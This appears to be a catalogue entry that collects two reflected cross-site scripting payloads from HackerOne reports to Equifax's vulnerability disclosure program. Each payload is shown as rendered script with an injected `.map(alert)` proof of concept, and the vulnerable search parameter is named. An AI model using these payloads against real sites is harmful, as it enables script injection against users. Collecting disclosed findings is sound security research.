# Equifax-vdp

2 payloads.

### `3bbb8270`

```
<script type="text/javascript">
	      window.onload = function(e){
	          Analytics.trackEvent('SEARCHRETURNED',{internalSearchTerm: "" , internalSearchTerm: [7].map(alert) , numOfSearchResultsReturned: "b" , numOfSearchResultsReturned: 167});            	
	               	}
	     </script>
```

**Parameter:** `search`
— [reflected XSS in \[target.com\]](https://hackerone.com/reports/1818163) · Equifax-vdp · [abdoubouanik](https://hackerone.com/abdoubouanik)

### `b623602c`

```
<script type="text/javascript">

var pageProduct = null;
window.onload = function(e){ 
		
		Analytics.trackEvent('SEARCHRETURNED', {internalSearchTerm: "" , internalSearchTerm: ["broook"].map(alert) , numOfSearchResultsReturned: "b" , numOfSearchResultsReturned: 1});
	
}
</script>
```

**Parameter:** `q`
— [reflected XSS in \[target.com\]](https://hackerone.com/reports/1818172) · Equifax-vdp · [abdoubouanik](https://hackerone.com/abdoubouanik)
